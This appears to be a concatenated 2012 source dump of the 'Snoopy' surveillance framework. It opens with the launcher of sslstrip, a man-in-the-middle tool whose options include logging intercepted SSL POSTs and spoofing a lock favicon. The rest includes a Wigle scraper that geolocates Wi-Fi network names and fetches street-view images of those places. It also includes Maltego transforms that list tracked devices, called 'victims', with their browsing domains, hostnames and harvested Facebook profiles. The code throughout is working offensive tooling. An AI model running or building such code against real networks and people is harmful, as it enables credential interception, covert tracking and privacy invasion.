                        filename=logFile, filemode='a')

    URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
    CookieCleaner.getInstance().setEnabled(killSessions)

    strippingFactory              = http.HTTPFactory(timeout=10)
    strippingFactory.protocol     = StrippingProxy

    reactor.listenTCP(int(listenPort), strippingFactory)
                
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."

    reactor.run()

if __name__ == '__main__':
    main(sys.argv[1:])

########NEW FILE########
__FILENAME__ = sslstrip1
#!/usr/bin/env python

"""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks."""
 
__author__ = "Moxie Marlinspike"
__email__  = "moxie@thoughtcrime.org"
__license__= """
Copyright (c) 2004-2009 Moxie Marlinspike <moxie@thoughtcrime.org>
 
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License as
published by the Free Software Foundation; either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but
WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
USA

"""

from twisted.web import http
from twisted.internet import reactor

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import sys, getopt, logging, traceback, string, os

gVersion = "0.9"

def usage():
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike"
    print "Usage: sslstrip <options>\n"
    print "Options:"
    print "-w <filename>, --write=<filename> Specify file to log to (optional)."
    print "-p , --post                       Log only SSL POSTs. (default)"
    print "-s , --ssl                        Log all SSL traffic to and from server."
    print "-a , --all                        Log all SSL and HTTP traffic to and from server."
    print "-l <port>, --listen=<port>        Port to listen on (default 10000)."
    print "-f , --favicon                    Substitute a lock favicon on secure requests."
    print "-k , --killsessions               Kill sessions in progress."
    print "-h                                Print this help message."
    print ""

def parseOptions(argv):
    logFile      = 'sslstrip.log'
    logLevel     = logging.WARNING
    listenPort   = 10000
    spoofFavicon = False
    killSessions = False
    
    try:                                
        opts, args = getopt.getopt(argv, "hw:l:psafk", 
                                   ["help", "write=", "post", "ssl", "all", "listen=", 
                                    "favicon", "killsessions"])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-w", "--write"):
                logFile = arg
            elif opt in ("-p", "--post"):
                logLevel = logging.WARNING
            elif opt in ("-s", "--ssl"):
                logLevel = logging.INFO
            elif opt in ("-a", "--all"):
                logLevel = logging.DEBUG
            elif opt in ("-l", "--listen"):
                listenPort = arg
            elif opt in ("-f", "--favicon"):
                spoofFavicon = True
            elif opt in ("-k", "--killsessions"):
                killSessions = True

        return (logFile, logLevel, listenPort, spoofFavicon, killSessions)
                    
    except getopt.GetoptError:           
        usage()                          
        sys.exit(2)                         

def main(argv):
    print argv
    print type(argv)

    (logFile, logLevel, listenPort, spoofFavicon, killSessions) = parseOptions(argv)
        
    logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                        filename=logFile, filemode='a')

    URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
    CookieCleaner.getInstance().setEnabled(killSessions)

    strippingFactory              = http.HTTPFactory(timeout=10)
    strippingFactory.protocol     = StrippingProxy

    reactor.listenTCP(int(listenPort), strippingFactory)
                
    print "\nsslstrip " + gVersion + " by Moxie Marlinspike running..."

    reactor.run()

if __name__ == '__main__':
    main(sys.argv[1:])

########NEW FILE########
__FILENAME__ = stawk_db
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import MySQLdb
import logging
import time

dbhost="localhost"
dbuser="snoopy"
dbpass="RANDOMPASSWORDGOESHERE"
dbdb="snoopy"
retries=20

def dbconnect():
	for i in range(retries):
		try:
			# unicdoe is a whore
			db = MySQLdb.connect(dbhost, dbuser,dbpass,dbdb, use_unicode=True, charset='utf8')
			db.autocommit(True)
		except Exception,e:
			logging.error("Unable to connect to MySQL! I'll try %d more times"%(retries-i))
			logging.error(e)
			time.sleep(5)
		else:
	        	return db.cursor()


########NEW FILE########
__FILENAME__ = vpn_drones
#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# Determines if Drones are connected via OpenVPN

import re
import time

f=open("/etc/openvpn/openvpn-status.log", "r")
line=f.readline()
while ( not re.search('^Common.*',line)):
	line=f.readline()

line=f.readline()
while ( not re.search('^ROUTING.*',line)):
	line=line.strip()
	r=line.split(',')
	client,ip,time=r[0],r[1],r[4]
	ip=ip.split(':')[0]
#	print "'%s' connected since' %s' (from '%s')" %(client,time,ip)
	print "%s\t%s\t%s" %(time,ip,client)

	line=f.readline()
	

########NEW FILE########
__FILENAME__ = wigle_api_lite
#!/usr/bin/python
# coding=utf-8
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# Crude wigle web API. The non-lite version supports multiple proxies 
# each with their own wigle account, but this violates Wigle policies
# (and is therefore not going to be given to you).
# Go join Wigle and support their project, they're an aweomse bunch.

import time
from random import randint
import re
import sys
from collections import deque
import requests
from BeautifulSoup import BeautifulSoup
import pprint
import math
import socket
import sys
import logging
import os
import urllib2
import httplib2
import urllib
import json

pp = pprint.PrettyPrinter(indent=4)

fd=os.path.dirname(os.path.realpath(__file__))
tmp=re.search('(^.*)\/.*',fd)
save_dir="%s/web_data/street_views"%tmp.group(1)

def wigle(account,ssid):

	url={'land':"https://wigle.net/", 'login': "https://wigle.net/gps/gps/main/login", 'query':"http://wigle.net/gps/gps/main/confirmquery/"}

	#1. Create HTTP objects with proxy
	user,password,proxy=account
	proxies = {"http":proxy,"https":proxy}	
	#2. Log in to Wigle
	logging.debug("[+] Logging into wigle with %s:%s via proxy '%s'" %(user,password,proxy))
	payload={'credential_0':user, 'credential_1':password}
	try:
		r = requests.post(url['login'],data=payload,proxies=proxies,timeout=10)
	except Exception, e: #(requests.exceptions.ConnectionError,requests.exceptions.Timeout), e:
		logging.debug("[E] Unable to connect via proxy %s. Thread returning." %(proxy))
		print e
		return {'error':e}
	if( 'Please login' in r.text or 'auth' not in r.cookies):
		logging.debug("[-] Error logging in with credentials %s:%s. Thread returning." %(user,password))
		return {'error':'Unable to login to wigle'}
		#exit(-1)
	else:
		logging.debug("[-] Successfully logged in with credentials %s:%s via %s." %(user,password,proxy))
	cookies=dict(auth=r.cookies['auth'])
	#3. Poll SSID queue
	logging.debug("[-] Looking up %s (%s %s)" %(ssid,user,proxy))
	payload={'longrange1': '', 'longrange2': '', 'latrange1': '', 'latrange2':'', 'statecode': '', 'Query': '', 'addresscode': '', 'ssid': ssid, 'lastupdt': '', 'netid': '', 'zipcode':'','variance': ''}
	try:
		r = requests.post(url['query'],data=payload,proxies=proxies,cookies=cookies,timeout=10)
		if( r.status_code == 200):
	        	if('too many queries' in r.text):
	                	logging.debug("[-] User %s has been shunned, pushing %s back on queue... Sleeping for 10 minutes..." %(user,ssid))
	                elif('An Error has occurred:' in r.text):
	             		logging.debug("[-] An error occured whilst looking up '%s' with Wigle account '%s' (via %s)!" % (ssid,user,proxy))
				return {'error':'Text response contained "An Error has occurred"'}
	            	elif('Showing stations' in r.text):
				locations=fetch_locations(r.text,ssid)
				#pp.pprint(locations)
				return locations
			else:
				logging.debug("[-] Unknown error occured whilst looking up '%s' with Wigle account '%s' (via %s)!" % (ssid,user,proxy))
				#exit(-1)
		else:
			logging.debug("[-] Bad status - %s" %r.status_code)
			return {'error':'Bad HTTP status - %s'%r.status_code}
	
	except (requests.exceptions.ConnectionError, requests.exceptions.Timeout), e:
		logging.debug("[-] Exception. Unable to retrieve SSID '%s' with creds %s:%s via '%s'. Returning SSID to queue" %(ssid,user,password,proxy))
		return {'error':e}
	


def fetch_locations(text,ssid):
	soup=BeautifulSoup(text)
        results=soup.findAll("tr", {"class" : "search"})
        locations=[]
        overflow=0
        if (len(results)>99 ):
       		overflow=1
        for line in results:
		try:
	        	row=line.findAll('td')
	                if( row[2].string.lower() == ssid.lower()):
	                        	locations.append({'ssid':ssid,'mac':row[1].string, 'last_seen':row[9].string, 'last_update':row[15].string, 'lat':row[12].string, 'long':row[13].string,'overflow':overflow})
	                        	#locations.append({'ssid':row[2].string,'mac':row[1].string, 'last_seen':row[9].string, 'last_update':row[15].string, 'lat':row[12].string, 'long':row[13].string,'overflow':overflow})
		except Exception:
			pass

        # Sort by last_update
        sorted=False
        while not sorted:
             	sorted=True
                for i in range(0,len(locations)-1):
                      	if( int(locations[i]['last_update']) < int(locations[i+1]['last_update'])):
                               	sorted=False
                                locations[i],locations[i+1] = locations[i+1],locations[i]

        # Remove duplicates within proximity of each other, keeping the most recent
        # TODO: Update this to find the great circle average
        remove_distance=5000 #5 kilometres
        tD={}
        for i in range(0,len(locations)-1):
        	for j in range(i+1,len(locations)):
                	dist=haversine(float(locations[i]['lat']),float(locations[i]['long']),float(locations[j]['lat']),float(locations[j]['long']))
                        if (dist < remove_distance):
                             	#logging.debug(" %d and %d are %d metres apart, thus, DELETION! :P" % (j,dist))
              	                tD[j]=1
        tmp=[]
        for i in range(0,len(locations)):
                if (i not in tD):
              		tmp.append(locations[i])

        locations=tmp
	if( len(locations) == 0):
		locations.append({'ssid':ssid,'mac':'', 'last_seen':'', 'last_update':'', 'lat':'', 'long':'','overflow':-1}) #No results, just return the ssid
 
       	return locations        # Return list of locations

def haversine(lat1, lon1, lat2, lon2):
                R = 6372.8 # In kilometers
                dLat = math.radians(lat2 - lat1)
                dLon = math.radians(lon2 - lon1)
                lat1 = math.radians(lat1)
                lat2 = math.radians(lat2)

                a = math.sin(dLat / 2) * math.sin(dLat / 2) + math.sin(dLon / 2) * math.sin(dLon / 2) * math.cos(lat1) * math.cos(lat2)
                c = 2 * math.asin(math.sqrt(a))
                return R * c * 1000.0 # In metres

def getAddress(lat,lng):
        http=httplib2.Http()
        br_headers={'cache-control':'no-cache', 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)', 'host':'maps.google.com'}
        base='http://maps.google.com/maps/geo?output=json&sensor=true_or_false&q='
        base_img='http://maps.googleapis.com/maps/api/streetview?size=800x800&sensor=false&location='
        cords="%s,%s" %(lat,lng)

	logging.info("Saving streetview to %s/%s.jpg"%(save_dir,cords))
        urllib.urlretrieve(base_img+cords,"%s/%s.jpg"%(save_dir,cords))

        failed=0
        while(failed < 5): 
                headers,page = http.request(base+cords, method='GET', headers=br_headers)
                data = json.loads(page)

                if ( headers['status'] == "200" ):
                        if( data['Status']['code'] == 200):
                                address,country,code="","",""
                                try:
                                        address=data['Placemark'][0]['address']
                                        country=data['Placemark'][0]['AddressDetails']['Country']['CountryName']
                                        code=data['Placemark'][0]['AddressDetails']['Country']['CountryNameCode']
                                except:
                                        None

                                return {'http_status':200,'g_status':'200','address':address,'country':country,'code':code}
                        else:
                                return {'http_status':200,'g_status':data['Status']['code']}
                else:
                        print "Failed. Backing off for 5 seconds"
                        print headers['status']
                        time.sleep(5)
                        failed=failed+1

        return {'http_status':headers['status']}


def fetchLocations(ssid):
	global save_dir
	
	if not os.path.exists(save_dir) and not os.path.isdir(save_dir):
		os.makedirs(save_dir)

	logging.info("Wigling %s"%ssid)
	try:	
		f=open("%s/wigle_creds.txt"%fd)
		line=f.readline().strip()
		user,passw,proxy=line.split(':')
	except Exception,e:
		logging.debug("Unable to load Wigle creds from 'wigle_creds.txt'!")
		return {'error':'Unable to load creds from wigle_creds.txt'}
	account=(user,passw,proxy)
	logging.info("Using Wigle account %s"%user)

	if user=='setYourWigleUsername':
		return {'error':'Wigle credentials not set'}

	locations=wigle(account,ssid)

	if locations != None and 'error' not in locations:
		
		if (locations != None and locations[0]['overflow'] == 0):	
			for l in locations:
				l['ga']=getAddress(l['lat'],l['long'])

		elif locations != None:
			for l in locations:
				l['ga']={}

	#logging.debug(locations)
	return locations
	

if __name__ == "__main__":
	logging.basicConfig(level=logging.DEBUG,format='%(asctime)s %(levelname)s %(filename)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')
	if ( len(sys.argv) < 2):
		logging.error("Usage: wigle_api_lite.py <ssid>")
		sys.exit(-1)

	ssid=sys.argv[1]
	print fetchLocations(ssid)  
      #pp.pprint(fetchLocations(ssid))


########NEW FILE########
__FILENAME__ = common
lookback=400

########NEW FILE########
__FILENAME__ = fetchAllDomains
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt


import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
    	#logging.debug(MaltegoXML_in)
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	drone='%'
	now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

                # Maltego requires format e.g 2012-10-23 22:37:12.0
                now=now.strftime("%Y-%m-%d %H:%M:%S.0")
                start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
                end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")


        if 'location' in m.AdditionalFields:               
		location=m.AdditionalFields['location']
	else:  
                location="%"	

	if 'properties.drone' in m.AdditionalFields:
		drone=m.AdditionalFields['properties.drone']


	cursor.execute("SELECT domain, COUNT(*) FROM (SELECT domain, client_ip FROM squid_logs GROUP BY domain, client_ip) AS x GROUP BY domain")
	results=cursor.fetchall()

	for row in results:
		num=-1
		domain="fuck unicode"
		try:
			domain=row[0].encode('utf8','xmlcharrefreplace')
			num=row[1]
		except Exception,e:
			logging.debug(e)

        	NewEnt=TRX.addEntity("Domain", domain);
		NewEnt.addAdditionalFields("num","Number","strict",num)
		NewEnt.addAdditionalFields("domain","domain","strict",domain)
		NewEnt.setWeight(num)

		#NewEnt.addAdditionalFields("drone","drone","strict",drone)
                #NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start)
                #NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end)
                #NewEnt.addAdditionalFields("location","location","strict",location)
		#NewEnt.addAdditionalFields("run_id","run_id","strict",run_id)


        TRX.returnOutput()
try:    
	main()
except Exception, e:
	logging.debug(e)
                

########NEW FILE########
__FILENAME__ = fetchAllFacebook
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    fb_view_url=None
    try:
                p=os.path.dirname(os.path.realpath(__file__))
                f=open("%s/../setup/webroot_guid.txt"%p,"r")
                fb_view_url=f.readline().strip() + "/web_data/facebook/"
    except:
                logging.debug("Warning: Couldn't determind streetview webserver folder")



    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()


	try:

		cursor.execute("SELECT id,name,gender,locale,network,link,degree FROM facebook where degree=0")
		results=cursor.fetchall()

		for row in results:
			id,name,gender,locale,network,link,degree=row[0],row[1],row[2],row[3],row[4],row[5],row[6]
			NewEnt=TRX.addEntity("maltego.FacebookObject",name)
			NewEnt.addAdditionalFields("id","id","nostrict",id)
			NewEnt.addAdditionalFields("gender","gender","nostrict",gender)
			NewEnt.addAdditionalFields("locale","locale","nostrict",locale)
			NewEnt.addAdditionalFields("network","network","nostrict",network)
			NewEnt.addAdditionalFields("link","link","nostrict",link)
			NewEnt.addAdditionalFields("degree","degree","nostrict",degree)


			logging.debug("Facebook profile photo - %s/%s/profile.jpg" % (fb_view_url,id))
			if( fb_view_url != None):
                                NewEnt.addAdditionalFields("facebook_profile_photo","Profile","strict","%s/%s/profile.jpg"%(fb_view_url,id))
                                NewEnt.setIconURL("%s/%s/profile.jpg" % (fb_view_url,id))


        except Exception, e:
                logging.debug("Exception:")
                logging.debug(e)


        TRX.returnOutput()
    
main()
                

########NEW FILE########
__FILENAME__ = fetchClients
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
        m = MaltegoMsg(MaltegoXML_in)
	logging.debug(m)    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

#	logging.debug(m.AdditionalFields['end_time'])

	logging.info("Fetching victims")


	drone='%'
	if 'properties.drone' in m.AdditionalFields:
                drone=m.AdditionalFields['properties.drone']
	
	if 'drone' in m.AdditionalFields:
		drone=m.AdditionalFields['drone']
	
#	drone=m.AdditionalFields['drone']

        # If no start / end times are specified, we default to lookback 
        now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

	        # Maltego requires format e.g 2012-10-23 22:37:12.0
	        now=now.strftime("%Y-%m-%d %H:%M:%S.0")
	        start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
	        end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")

	logging.debug("1. S,E - %s / %s"%(start_time,end_time))

	if 'location' in m.AdditionalFields:
                location=m.AdditionalFields['location']
		# I'm a dirty hacker, short and stout.
		logging.debug("SELECT MIN(timestamp),MAX(timestamp) FROM probes WHERE location LIKE %s AND monitor_id=%s AND timestamp >= %s AND timestamp <= %s"%(location,drone,start_time,end_time))
		cursor.execute("SELECT MIN(timestamp),MAX(timestamp) FROM probes WHERE location LIKE %s AND monitor_id=%s AND timestamp >= %s AND timestamp <= %s",(location,drone,start_time,end_time))
		result=cursor.fetchone()
		start_time=result[0]
		end_time=result[1]
        else:
                location="%"


	logging.debug("2. S,E - %s / %s"%(start_time,end_time))
	logging.debug(drone)


	try:

		logging.info("SELECT DISTINCT device_mac,vendor_short,monitor_id AS drone_id,'probes' AS source, IFNULL(hostname,'') AS hostname,location FROM proximity_sessions LEFT OUTER JOIN dhcp_leases ON proximity_sessions.device_mac = dhcp_leases.mac WHERE monitor_id='%s' AND location LIKE '%s' AND last_probe > '%s' AND last_probe < '%s' UNION SELECT DISTINCT dhcp_leases.mac,mac_vendor.vendor_short,drone_conf.id AS drone_id, 'web' AS source, dhcp_leases.hostname, '' AS location from dhcp_leases inner join mac_vendor on mac_prefix=mac_vendor.mac inner join squid_logs on client_ip=dhcp_leases.ip inner join drone_conf on drone_conf.ip_prefix=dhcp_leases.ip_prefix WHERE drone_conf.id='%s' AND timestamp > '%s' AND timestamp < '%s'"%(drone,location,start_time,end_time,drone,start_time,end_time))
		cursor.execute("SELECT DISTINCT device_mac,vendor_short,monitor_id AS drone_id,'probes' AS source, IFNULL(hostname,'') AS hostname,location FROM proximity_sessions LEFT OUTER JOIN dhcp_leases ON proximity_sessions.device_mac = dhcp_leases.mac WHERE monitor_id=%s AND location LIKE %s AND last_probe >= %s AND last_probe <= %s UNION SELECT DISTINCT dhcp_leases.mac,mac_vendor.vendor_short,drone_conf.id AS drone_id, 'web' AS source, dhcp_leases.hostname, '' AS location from dhcp_leases inner join mac_vendor on mac_prefix=mac_vendor.mac inner join squid_logs on client_ip=dhcp_leases.ip inner join drone_conf on drone_conf.ip_prefix=dhcp_leases.ip_prefix WHERE drone_conf.id=%s AND timestamp >= %s AND timestamp <= %s",(drone,location,start_time,end_time,drone,start_time,end_time))
		results=cursor.fetchall()
		logging.debug( "Observed %d clients" %len(results))

		dataz={}
		for row in results:
			logging.debug(row)
		        mac=row[0]
		        vendor=row[1]
			drone=row[2]
		        source=row[3]
		        hostname=row[4]
			obs_location=row[5]
		        tmp={'vendor':vendor,'hostname':hostname}
		        if source=='web':
		                tmp['from_web']="True"
		        elif source == 'probes':
		                tmp['from_probes']="True"
		
		        if mac not in dataz:
		                dataz[mac]=tmp
				dataz[mac]['obs_location']=obs_location
		        else:  
		                dataz[mac] = dict(dataz[mac].items() + tmp.items())
				dataz[mac]['obs_location'] = dataz[mac]['obs_location'] + ", " + obs_location



		for k,v in dataz.iteritems():
	       	 	mac=k
			vendor=v['vendor']
			hostname=v['hostname']
			obs_location=v['obs_location']
			from_web,from_probes="False","False"
			if 'from_web' in v:
				from_web="True"
			if 'from_probes' in v:
				from_probes="True"
        	
	#		if from_web == "False":
			if len(hostname) < 1:
				NewEnt=TRX.addEntity("snoopy.Client", "%s"%(vendor));
			else:
				NewEnt=TRX.addEntity("snoopy.Client", "%s (%s)"%(vendor,hostname))
			NewEnt.addAdditionalFields("mac","mac address", "strict",mac)
			NewEnt.addAdditionalFields("vendor","vendor","strict",vendor)
			NewEnt.addAdditionalFields("hostname","hostname","hostname",hostname)

			NewEnt.addAdditionalFields("from_web","from_web","nostrict",from_web)
			NewEnt.addAdditionalFields("from_probes","from_probes","nostrict",from_probes)

			NewEnt.addAdditionalFields("drone","drone","nostrict",drone)
		
			NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start_time)
			NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end_time)
     			NewEnt.addAdditionalFields("location","Location","nostrict",location)
     			NewEnt.addAdditionalFields("obs_location","Observed Locations","nostrict",obs_location)
			
	
			#Add something to icon to distinguish probes and web?
 
        except Exception, e:
                logging.debug("Exception from fetchClients.py:")
                logging.debug(e)


	TRX.returnOutput()

try:   
	main()
except Exception,e:
	logging.debug(e)

########NEW FILE########
__FILENAME__ = fetchClientsFromCountry
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *
logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
    	#logging.debug(MaltegoXML_in)
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	drone='%'
	now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

                # Maltego requires format e.g 2012-10-23 22:37:12.0
                now=now.strftime("%Y-%m-%d %H:%M:%S.0")
                start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
                end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")


        if 'location' in m.AdditionalFields:               
		location=m.AdditionalFields['location']
	else:  
                location="%"	

	if 'properties.drone' in m.AdditionalFields:
		drone=m.AdditionalFields['properties.drone']


	country='%'
	if 'country' in m.AdditionalFields:
		country=m.AdditionalFields['country']

	cursor.execute("SELECT DISTINCT device_mac,vendor_short,IF(hostname IS NULL, '', CONCAT('(',hostname,')')) AS hostname, IF(hostname IS NULL, 'False','True') AS from_web, 'True' AS from_probes FROM probes LEFT OUTER JOIN dhcp_leases ON probes.device_mac = dhcp_leases.mac JOIN wigle ON probes.probe_ssid=wigle.ssid JOIN mac_vendor ON probes.mac_prefix=mac_vendor.mac AND country=%s",(country))	
	results=cursor.fetchall()

	for row in results:
		mac,vendor,hostname,from_web,from_probes=row[0],row[1],row[2],row[3],row[4]
		NewEnt=TRX.addEntity("snoopy.Client", "%s %s"%(vendor,hostname))

		NewEnt.addAdditionalFields("mac","mac address", "strict",mac)
		NewEnt.addAdditionalFields("vendor","vendor","strict",vendor)
		NewEnt.addAdditionalFields("hostname","hostname","hostname",hostname)
		
		NewEnt.addAdditionalFields("from_web","from_web","nostrict",from_web)
		NewEnt.addAdditionalFields("from_probes","from_probes","nostrict",from_probes)



		#NewEnt.addAdditionalFields("drone","drone","strict",drone)
                #NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start)
                #NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end)
                #NewEnt.addAdditionalFields("location","location","strict",location)
		#NewEnt.addAdditionalFields("run_id","run_id","strict",run_id)


        TRX.returnOutput()
try:    
	main()
except Exception, e:
	logging.debug(e)
                

########NEW FILE########
__FILENAME__ = fetchClientsFromDomain
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
    	#logging.debug(MaltegoXML_in)
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	drone='%'
	now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

                # Maltego requires format e.g 2012-10-23 22:37:12.0
                now=now.strftime("%Y-%m-%d %H:%M:%S.0")
                start_time=start_time.strftime("%Y-%m-%d %H:%M:%S.0")
                end_time=end_time.strftime("%Y-%m-%d %H:%M:%S.0")


        if 'location' in m.AdditionalFields:               
		location=m.AdditionalFields['location']
	else:  
                location="%"	

	if 'properties.drone' in m.AdditionalFields:
		drone=m.AdditionalFields['properties.drone']

	domain='None'
	if 'domain' in m.AdditionalFields:
		domain=m.AdditionalFields['domain']


	cursor.execute("SELECT DISTINCT client_ip,hostname,dhcp_leases.mac,vendor_short,ua FROM dhcp_leases,squid_logs,mac_vendor WHERE squid_logs.client_ip=dhcp_leases.ip AND dhcp_leases.mac_prefix=mac_vendor.mac AND domain = %s",(domain))
	results=cursor.fetchall()

	for row in results:

		try:
			client_ip=row[0]
			hostname=row[1].encode('utf8','xmlcharrefreplace')
			mac=row[2]
			vendor=row[3].encode('utf8','xmlcharrefreplace')
			useragent=row[4].encode('utf8','xmlcharrefreplace')
		except Exception,e:
			logging.debug(e)

        	NewEnt=TRX.addEntity("snoopy.Client", "%s (%s)"%(vendor,hostname))
		NewEnt.addAdditionalFields("hostname","hostname","strict",hostname)
		NewEnt.addAdditionalFields("mac","mac","strict",mac)
		NewEnt.addAdditionalFields("vendor","vendor","strict",vendor)
#		NewEnt.addAdditionalFields("useragent","useragent","strict",useragent)	#Some devices have multiple UAs
		NewEnt.addAdditionalFields("from_web","from_web","strict","True")
                NewEnt.addAdditionalFields("from_probes","from_probes","strict","True")

		#NewEnt.addAdditionalFields("drone","drone","strict",drone)
                #NewEnt.addAdditionalFields("start_time", "start_time", "nostrict",start)
                #NewEnt.addAdditionalFields("end_time","end_time", "nostrict",end)
                #NewEnt.addAdditionalFields("location","location","strict",location)
		#NewEnt.addAdditionalFields("run_id","run_id","strict",run_id)


        TRX.returnOutput()
try:    
	main()
except Exception, e:
	logging.debug(e)
                

########NEW FILE########
__FILENAME__ = fetchClientsFromUA
#!/usr/bin/python
# -*- coding: utf-8 -*-
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

import sys
import os
from Maltego import *
import stawk_db
import logging
import datetime
from common import *

logging.basicConfig(level=logging.DEBUG,filename='/tmp/maltego_logs.txt',format='%(asctime)s %(levelname)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

sys.stderr = sys.stdout

def main():

    print "Content-type: xml\n\n";
    MaltegoXML_in = sys.stdin.read()
    if MaltegoXML_in <> '':
    	#logging.debug(MaltegoXML_in)
        m = MaltegoMsg(MaltegoXML_in)
    
	cursor=stawk_db.dbconnect()
        TRX = MaltegoTransform()

	drone='%'
	now=datetime.datetime.now()
        if 'start_time' in m.AdditionalFields and 'end_time' in m.AdditionalFields :
                start_time=m.AdditionalFields['start_time']
                end_time=m.AdditionalFields['end_time']
        else:  
                start_time=now+datetime.timedelta(seconds=-lookback)
                end_time=now+datetime.timedelta(seconds=lookback)

                # Maltego requires format e.g 2012-10-23 22:37:12.0
